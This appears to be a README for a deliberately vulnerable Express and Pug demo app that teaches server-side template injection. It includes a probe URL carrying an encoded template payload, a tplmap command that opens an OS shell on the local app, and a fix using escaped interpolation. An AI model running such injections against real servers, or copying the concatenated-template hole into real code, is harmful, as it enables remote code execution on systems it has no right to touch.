This application is a demonstration prototype just to show how to perform SSTI (Server side templating injection) attack. This application use Express and Pug as templating engine. This tutorial is based on https://appsec.amanvir.io/exploring-template-injection

# Step 0

* Install nodejs

* Install express and pug

```console
$ npm install
```

* Install tplmap

```console
$ git clone https://github.com/epinna/tplmap.git
$ cd tplmap
$ virtualenv --python=/usr/bin/python2.7 venv
$ source ./venv/bin/activate
$ pip install -r requirements.txt
```

# Step 1 

* Start application

```console
$ node app.js
```

* Open http://localhost:3000/?name=bob

* Open http://localhost:3000/?name=%23%7B7*7%7D to test if your application is expose to SSTI (name={7*7})

* Run SSTI attack with [tplmap](https://github.com/epinna/tplmap/blob/master/README.md)

```console
(venv)$ ./tplmap.py --engine pug --os-shell -u http://localhost:3000/?name=bob
```

In this example, the template is built by concatenation ("template literals" introduce in ES6).

# Step 2

The right way is to define a template with escaped data [interpolation](https://pugjs.org/language/interpolation.html).

* Select the branch

```console
$ git checkout step2
```

* Start application

```console
$ node app.js
```

* Run tplmap again

Now, the "name" parameter appear to be not injectable.
